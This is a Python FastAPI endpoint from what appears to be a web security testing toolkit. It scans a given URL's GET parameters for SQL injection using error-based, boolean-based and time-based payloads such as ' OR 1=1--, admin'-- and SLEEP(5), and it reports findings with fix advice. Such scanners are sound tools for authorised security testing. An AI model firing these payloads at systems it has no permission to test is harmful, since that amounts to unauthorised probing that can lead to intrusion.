import re
import time
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fastapi import APIRouter
from models import SqliReq
from tools.utils import http_get, f, ok, err

router = APIRouter(tags=["exploitation"])

SQL_ERRORS = ["mysql", "sql syntax", "ora-", "postgresql", "unterminated", "sqlstate",
              "pg_query", "mysqli", "odbc", "mssql", "native client", "db2", "sybase",
              "you have an error", "warning: mysql", "unclosed quotation",
              "quoted string not properly terminated", "invalid query"]

ERROR_PAYLOADS = ["'", '"', "''", "`", "' OR '1'='1", "' OR 1=1--",
                  "\" OR 1=1--", "' OR 'x'='x", "' OR 1=1#", "admin'--"]

BOOL_PAIRS = [("' AND 1=1--", "' AND 1=2--"), ("' AND '1'='1'--", "' AND '1'='2'--"),
              ("1 AND 1=1", "1 AND 1=2")]

TIME_PAYLOADS = ["'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--",
                 "' OR SLEEP(5)--", "' AND SLEEP(5)--", "'; SELECT pg_sleep(5)--"]


def inject_param(url: str, param: str, payload: str) -> str:
    p = urlparse(url)
    params = parse_qs(p.query, keep_blank_values=True)
    params[param] = [payload]
    new_q = urlencode(params, doseq=True)
    return urlunparse(p._replace(query=new_q))


@router.post("/sqli")
async def sql_injection(req: SqliReq):
    parsed = urlparse(req.target)
    params = parse_qs(parsed.query)
    if not params:
        return err("No GET parameters in URL — add ?param=value")

    findings = []
    records = []
    vulnerable = False

    base = await http_get(req.target, timeout=10)
    base_len = len(base.get("body", ""))

    for param in params:
        # Error-based
        if req.type in ["all", "error"]:
            for payload in ERROR_PAYLOADS:
                url = inject_param(req.target, param, payload)
                r = await http_get(url, timeout=8)
                body_l = r["body"].lower()
                for err_str in SQL_ERRORS:
                    if err_str in body_l:
                        vulnerable = True
                        findings.append(f("critical", f"SQLi Error-Based: param={param}",
                                           f"Payload: {payload} → error keyword '{err_str}'",
                                           "Use parameterized queries / prepared statements"))
                        records.append({"Type": "Error-Based", "Param": param,
                                        "Payload": payload[:60], "Evidence": err_str})
                        break
                if vulnerable:
                    break

        # Boolean-based
        if req.type in ["all", "boolean"] and not vulnerable:
            for true_p, false_p in BOOL_PAIRS:
                r_true  = await http_get(inject_param(req.target, param, true_p), timeout=8)
                r_false = await http_get(inject_param(req.target, param, false_p), timeout=8)
                diff = abs(len(r_true["body"]) - len(r_false["body"]))
                if diff > 50:
                    vulnerable = True
                    findings.append(f("critical", f"SQLi Boolean-Based: param={param}",
                                       f"True payload returns {len(r_true['body'])}B, False {len(r_false['body'])}B — diff={diff}",
                                       "Use parameterized queries"))
                    records.append({"Type": "Boolean-Based", "Param": param,
                                    "Payload": true_p, "Evidence": f"Length diff: {diff}B"})
                    break

        # Time-based
        if req.type in ["all", "time"] and not vulnerable:
            for payload in TIME_PAYLOADS[:3]:
                url = inject_param(req.target, param, payload)
                t0 = time.monotonic()
                await http_get(url, timeout=12)
                elapsed = time.monotonic() - t0
                if elapsed >= 4.5:
                    vulnerable = True
                    findings.append(f("critical", f"SQLi Time-Based: param={param}",
                                       f"Payload caused {elapsed:.1f}s delay",
                                       "Use parameterized queries"))
                    records.append({"Type": "Time-Based", "Param": param,
                                    "Payload": payload[:60], "Evidence": f"{elapsed:.2f}s delay"})
                    break

    if not vulnerable:
        findings.append(f("pass", "No SQLi Detected",
                           "Automated payloads found no obvious injection",
                           "Manual testing + sqlmap recommended"))

    return ok({"summary": {"URL": req.target, "Params Tested": len(params),
                            "Vulnerable": "YES" if vulnerable else "No"},
               "findings": findings, "records": records,
               "record_columns": ["Type", "Param", "Payload", "Evidence"]})
